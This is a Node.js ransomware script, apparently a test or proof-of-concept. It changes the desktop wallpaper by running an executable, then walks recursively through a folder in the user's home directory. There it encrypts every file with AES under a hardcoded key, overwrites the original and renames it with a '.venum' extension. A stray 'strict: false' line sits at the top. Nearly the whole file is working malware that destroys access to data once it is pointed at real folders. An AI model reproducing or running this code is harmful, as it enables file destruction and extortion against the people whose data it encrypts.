strict: false
const fs = require('fs')
const path = require('path')
const AES = require('aes-encryption')
const cp = require('node:child_process')
const promisify = require('node:util')
const aes = new AES()
const os = require('os')

aes.setSecretKey('11122233344455566677788822244455555555555555555231231321313aaaff')
const user = os.userInfo().username
//this is the root of your testing folder...tweak as needed 
const TARGETS = [
    `C:\\Users\\${user}\\taimtest`,

]

const execFile = promisify.promisify(cp.execFile);
async function setWallpaper() {
    const binary = path.join(__dirname, 'windows-wallpaper.exe')
    await execFile(binary, [path.join(__dirname, 'bg.png')]);
}

const crawlerLoop = async() => {
    let cwd = process.cwd()
    let root = fs.readdirSync(cwd)
    root.forEach((i) => {
        fs.stat(path.join(cwd, i),async(err, stats) => {
            if(err){}
            if (stats.isFile()) {
                try {
                    console.log(i)
                    const readFile = promisify.promisify(fs.readFile)
                    const writeFile = promisify.promisify(fs.writeFile)
                    const data = await readFile(path.join(cwd, i))
                    const encrypt = aes.encrypt(data)
                    await writeFile(path.join(cwd, i), encrypt)
                    fs.renameSync(path.join(cwd, i), path.join(cwd, `${i}.venum`))
                } catch (e) {

                }

            }
            if (stats.isDirectory()){
                console.log(i)
                process.chdir(path.join(cwd, i))
                crawlerLoop()

            }
        })
    })
}


const crawl = async () => {
    await setWallpaper()
    
    TARGETS.forEach(async(i,index)=>{
        process.chdir(i)
        await crawlerLoop().then(()=>{
            process.chdir(TARGETS[index])
        })
    })
}
crawl()